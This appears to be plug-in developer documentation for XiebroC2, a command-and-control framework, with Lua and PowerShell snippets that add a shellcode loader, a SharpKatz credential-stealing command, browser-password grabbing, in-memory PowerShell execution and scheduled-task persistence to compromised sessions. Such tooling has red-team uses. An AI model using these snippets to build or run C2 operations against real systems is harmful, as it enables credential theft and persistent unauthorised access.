# Table of Contents

- [1. Extend external form](#1 Extend external form)

- [2. Extend Session command](#2 Extend session command)

- [3. Extend function menu bar](#3 Extend function menu bar)

- [4. Menu bar arrangement](#4 Menu bar arrangement)

- [5. Use built-in API to extend form](#5 Use built-in API to extend form)

When writing plug-ins, please refer to the function prototype carefully: [XiebroC2-PluginsFunctions](https://github.com/INotGreen/Xiebro-Plugins/blob/main/Function.md)

## 1. Extend external form

xiebroC2 provides a simple plug-in interface, which can lower the threshold of plug-in writing and realize the plug-in system like CobaltStrike

For example, to add a shellcode separation loader to the top menu bar of the control end:

<video src="https://private-user-images.githubusercontent.com/89376703/311126700-913d66d5-fe82-459a-8b3d-ea73682a9bb7.mp4?" width="640" height="480" controls></video>

- Convert Winform .Net program to XiebroC2's lua plug-in

```powershell
Import-Module .\Convert-NetToLua.ps1
Convert-NetToLua -infile .\Plugins.exe -Output a.lua -Name loader
```

When writing winform, you need to change the entry point to the following. If it is started by Application.EnableVisualStyles, when it is converted to a lua plug-in, the main control end will report an error when loading

```C#
internal static class Program
{
/// <summary>
/// The main entry point of the application.
/// </summary>
[STAThread]
static void Main()
{
Form1 form1 = new Form1();
form1.ShowDialog();
}
}
```

## 2. Extend Session command

<img src="Image\\image-20240308134300864.png" />

Add external command in command list

```lua
AddCommand(
"SharpKatz", --Name
"Plugins\\SharpKatz.exe", -- FilePath
"execute-assembly", --load type
"Steal domain login credentials", --Descripttion
"SharpKatz -h" --Usage
)
```

- The third parameter of AddCommand has three loading methods. If it is a .net assembly, select "execute-assembly" and "Inline-assembly". If it is a PE file written in C/C++/Golang/rust/nim, select RunPE
- SharpKatz command added successfully

<img src="Image\\image-20240308144452120.png" />

## 3. Extended function menu bar

```lua
AddMenuItemA("Pentest", null)
AddMenuItemB("GetIPInfo", "", function() Nopowershell("ipconfig", "1") end)
```

- AddMenuItemB has one more parameter for click event than AddMenuItemA (similar to callback function). Lua does not seem to support overloading, so I use function A and B to distinguish.

- Nopowershell can execute unmanaged powershell in memory without starting the Powershell.exe process. In fact, you can refer to the code example of [nopowershell](https://github.com/INotGreen/Nopowershell).

- It is worth noting that whether Nopowershell execution creates a child process depends on the parameter configuration in Profile.json. If Fork is false, powershell is executed without a process.

```json
{
"TeamServerIP": "192.168.1.250",
"TeamServerPort": "8880",
"Password": "123456",
"StagerPort": "4050",
"Telegram_Token": "",
"Telegram_chat_ID": "",
"Fork": false,
"Route": "www",
"Process64": "C:\\windows\\system32\\notepad.exe",
"Process86": "C:\\Windows\\SysWOW64\\notepad.exe",
"WebServers": [],
"listeners": [],
"rdiShellcode32": "",
"rdiShellcode64": "",
}
```

## 4. Menu bar arrangement

```lua
AddMenuItemA("Pentest", null)
AddMenuItemA("CollectInfo", null) --
AddMenuItemA("Grab browser Passwords", null)
AddMenuItemA("Persistence", null)
AddMenuItemA("Scheduled Tasks", null)
AddMenuItemB("Installation", "", SchTaskForm)
AddMenuItemB("Privilege", null, function() Sessionlog("Message") end)

AddMenuItemB("4.0", "", function() Nopowershell("ipconfig", "1") end)

local menuStructure = {
["Pentest"] = {"CollectInfo", "Persistence", "Privilege"},
["CollectInfo"] = {"Grab browser Passwords"},
["Persistence"] = {"Scheduled Tasks"},
["Scheduled Tasks"] = {"Installation"},
["Privilege"] = {"4.0"}
}
for parent, subs in pairs(menuStructure) do AddMenuItemsAsSubItems(parent, subs) end
```

In this way, you can organize the parent-child relationship of the menu bar

<img src="Image\image-20240308150949896.png" />

## 5. Extend the form using the built-in API

```lua
local function SchTaskForm()
local IsOK = false
local Form1 = CreateForm("sch", 422, 355)

local Label1 = Addlabel(Form1, "Interval(min):", 17, 33, 133, 25)
local Label2 = Addlabel(Form1, "Select File:", 31, 103, 114, 25)
local Label3 = Addlabel(Form1, "Directory:", 28, 174, 114, 25)

local addButton = AddSelectFileButton(Form1, "Select", 162, 100, 181, 33)
local texBox1 = AddTextBox(Form1, 162, 31, 181, 33)
local ComBox1 = AddComBox(Form1, 162, 174, 181, 33)
local Button1 = AddButton(Form1, "Ok", 36, 234, 106, 37, function()
if texBox1.Text ~= "" and ComBox1.Text ~= "" and addButton.Text ~=
"Select" then -- The values of texBox1 and ComBox1 can't be empty strings, otherwise this window
IsOK = true
Form1:Hide()

else
IsOK = false
MessageBoxA("adas")
end
end)

local Button2 = AddButton(Form1, "close", 236, 234, 107, 37,
function() Form1:Close() end)
Form1:ShowDialog()
if IsOK then
local FileName = GetFileName(addButton.Text)
local UploadFilePath = ComBox1.Text .. "\\" .. FileName
Upload(UploadFilePath, addButton.Text)
InlineAssembly("Plugins\\Scheduled.exe", texBox1.Text)
end
end

AddMenuItemB("Task installer", "", SchTaskForm)
```
